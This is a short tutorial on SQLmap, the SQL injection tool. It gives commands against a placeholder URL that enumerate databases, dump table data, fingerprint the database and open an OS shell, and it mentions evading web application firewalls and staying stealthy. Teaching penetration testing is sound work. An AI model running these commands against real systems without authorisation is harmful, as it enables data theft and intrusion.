# SQLmap

## Context

This article teaches the operational use of SQLmap, a powerful open-source tool for automated SQL injection testing and database exploitation. It assumes the reader is familiar with the basics of SQL injection, understands the fundamentals of database management systems, and is adept at handling HTTP requests.

## Theory

### SQLmap Purpose and Capabilities

SQLmap is renowned as an open-source tool specifically designed for automating SQL injection testing. Its primary goal is to ease the processes involved in detecting and exploiting SQL injection vulnerabilities within web applications.

The tool excels in automating the identification of exploitable SQL injection points, which can lead to database fingerprinting, fetching of sensitive data, and even executing commands on the database management system. It supports a multitude of DBMS, enhancing its adaptability and utility across different environments.

### SQLmap Configuration and Usage

To effectively utilize SQLmap, understanding its configuration is paramount. The configuration primarily involves specifying the target URL and the corresponding injection parameters. This sets the stage for the automation SQLmap offers.

SQLmap supports a wide range of database management systems, including but not limited to MySQL, PostgreSQL, Oracle, and MSSQL. It enhances flexibility and scope, catering to diverse database backends.

The tool streamlines the injection process through various command-line options, allowing for scripted automation that saves time and minimizes manual intervention.

### Advanced Features of SQLmap

SQLmap incorporates several advanced features, further broadening its exploitation capabilities. Among these, tamper scripts are particularly noteworthy. They enable SQLmap to bypass Web Application Firewalls (WAF) effectively, thus increasing the success rate of injection attacks on protected websites.

The integration capabilities of SQLmap with other exploitation tools present an opportunity to augment its functions, especially in sophisticated attack scenarios requiring multi-tool strategies. Additionally, SQLmap offers mechanisms to reduce noise and scope during attacks, optimizing stealth and efficiency.

## Practice

### Automated SQL Injection Testing with SQLmap

- **Identify databases on the target URL.**
  ```bash
  sqlmap -u 'http://example.com/vuln.php?id=1' --dbs
  ```

- **List tables in the specified database.**
  ```bash
  sqlmap -u 'http://example.com/vuln.php?id=1' -D target_db --tables
  ```

- **List columns in the specified table.**
  ```bash
  sqlmap -u 'http://example.com/vuln.php?id=1' -D target_db -T target_table --columns
  ```

- **Dump data from the specified column.**
  ```bash
  sqlmap -u 'http://example.com/vuln.php?id=1' -D target_db -T target_table -C target_column --dump
  ```

_Successful execution results in extracted data from the vulnerable database._

### Database Fingerprinting with SQLmap

- **Identify the DBMS and its version.**
  ```bash
  sqlmap -u 'http://example.com/vuln.php?id=1' --fingerprint
  ```

_The fingerprinting process unveils the database type and version, essential for planning subsequent attack phases._

### Command Execution via SQLmap

- **Obtain an operating system shell on the target.**
  ```bash
  sqlmap -u 'http://example.com/vuln.php?id=1' --os-shell
  ```

_Executing this command grants remote command execution capabilities on the target system._
